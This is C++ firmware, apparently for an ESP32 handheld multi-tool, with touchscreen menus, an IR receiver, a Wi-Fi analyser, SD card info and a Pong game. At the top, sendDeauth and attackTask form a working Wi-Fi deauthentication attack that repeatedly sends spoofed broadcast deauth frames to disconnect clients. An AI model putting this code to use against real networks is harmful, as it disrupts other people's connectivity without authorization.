void sendDeauth(uint8_t* apMac, uint8_t* clientMac) {
    uint8_t frame[26] = {
        0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Frame Control + Dest
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                         // Source (AP)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                         // BSSID
        0x00, 0x00, 0x07, 0x00                                      // Sequence + Reason (7 = Class 3 error)
    };
    memcpy(&frame[10], apMac, 6);
    memcpy(&frame[16], apMac, 6);
    
    // Dispara o frame
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
}
void attackTask(void* parameter) {
    while(true) {
        if(isAttacking) {
            sendDeauth(targetAP, targetClient);
            vTaskDelay(50 / portTICK_PERIOD_MS); // Ciclo agressivo, mas estável
        }
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}

// ============================================================================
// LEITURA DO TOUCH (BIT-BANG)
// ============================================================================
void lerTouchTotalmenteIsolado(int &x, int &y, int &z) {
  digitalWrite(TOUCH_CS, LOW);
  uint8_t cmds[] = {0xB0, 0xD0, 0x90};
  int *res[] = {&z, &x, &y};
  for (int c = 0; c < 3; c++) {
    uint8_t cmd = cmds[c];
    for (int i = 0; i < 8; i++) {
      digitalWrite(TOUCH_MOSI, (cmd & 0x80) ? HIGH : LOW); cmd <<= 1;
      digitalWrite(TOUCH_CLK, HIGH); digitalWrite(TOUCH_CLK, LOW);
    }
    int val = 0;
    for (int i = 0; i < 12; i++) {
      digitalWrite(TOUCH_CLK, HIGH); val <<= 1; if (digitalRead(TOUCH_MISO)) val |= 1; digitalWrite(TOUCH_CLK, LOW);
    }
    *res[c] = val;
  }
  digitalWrite(TOUCH_CS, HIGH);
}

// ============================================================================
// GERENCIAMENTO DE TOQUES
// ============================================================================
void handleTouch() {
  int tx = 0, ty = 0, tz = 0;
  lerTouchTotalmenteIsolado(tx, ty, tz);

  static byte touchCounter = 0;
  bool debouncedTouch = false;

  if (tz > 400) {
    touchCounter++;
    if (touchCounter >= 2) {
      debouncedTouch = true;
      touchCounter = 2;
    }
  } else {
    touchCounter = 0;
  }

  if (debouncedTouch) {
    if (!isTouching) {
      isTouching = true;
      touchStartTime = millis();
      actionHandled = false;
    } else {
      if ((millis() - touchStartTime >= LONG_TOUCH_DELAY) && !actionHandled) {
        actionHandled = true;
        executeEnterAction();
      }
    }
  } else {
    if (isTouching) {
      unsigned long touchDuration = millis() - touchStartTime;
      isTouching = false;

      if (touchDuration > 30 && touchDuration < LONG_TOUCH_DELAY && !actionHandled) {
        executeNextAction();
      }
    }
  }
}

void executeNextAction() {
  if (currentState == STATE_MENU) {
    currentSelectedIndex++;
    if (currentSelectedIndex >= TOTAL_MENU_ITEMS) {
      currentSelectedIndex = 0;
    }
    int newPage = currentSelectedIndex / ITEMS_PER_PAGE;
    if (newPage != currentPage) {
      currentPage = newPage;
    }
    renderMenu();
  }
  else if (currentState == STATE_WIFI_MENU) {
    wifiMenuSelectedIndex++;
    if (wifiMenuSelectedIndex >= 3) wifiMenuSelectedIndex = 0;
    drawScreen_WifiMenu();
    drawWifiMenuHighlight();
  }
  else if (currentState == STATE_WIFI_ANALYSER) {
    // Toque curto = próxima página de redes
    wifiAnalyserPage++;
    int maxPages = (wifiNetworksFound + 2) / 3;  // 3 redes por página
    if (wifiAnalyserPage >= maxPages) wifiAnalyserPage = 0;  // volta pra primeira página
    renderWifiAnalyserScreen();
  }
  else if (currentState == STATE_IR) {
    irLastProtocol = "Aguardando...";
    irLastValue = "---";
    irLastBits = 0;
    renderCurrentView();
  }
}

void executeEnterAction() {
  if (currentState == STATE_MENU) {
    switch (currentSelectedIndex) {
      case 0:
        currentState = STATE_IR;
        irLastProtocol = "Aguardando...";
        irLastValue = "---";
        irLastBits = 0;
        renderCurrentView();
        break;
      case 1:
        enterWifiMenu();
        break;
      case 2:
        currentState = STATE_SD;
        updateSDInfo();
        renderCurrentView();
        break;
      case 3:
        currentState = STATE_GAME;
        resetPongGame();
        break;
    }
  }
  else if (currentState == STATE_WIFI_MENU) {
    if (wifiMenuSelectedIndex == 0) {
      enterWifiAnalyser();
    } else {
      enterWifiConstruction();
    }
  }
  else if (currentState == STATE_WIFI_ANALYSER || currentState == STATE_WIFI_CONSTRUCTION) {
    enterWifiMenu();
  }
  else {
    currentState = STATE_MENU;
    renderMenu();
  }
}

// ============================================================================
// IR RECEIVER
// ============================================================================
void checkIRSignal() {
  if (irrecv.decode(&irResults)) {
    irLastProtocol = typeToString(irResults.decode_type);
    irLastValue = resultToHexidecimal(&irResults);
    irLastBits = irResults.bits;
    irSignalCount++;
    irrecv.resume();
    renderCurrentView();
  }
}

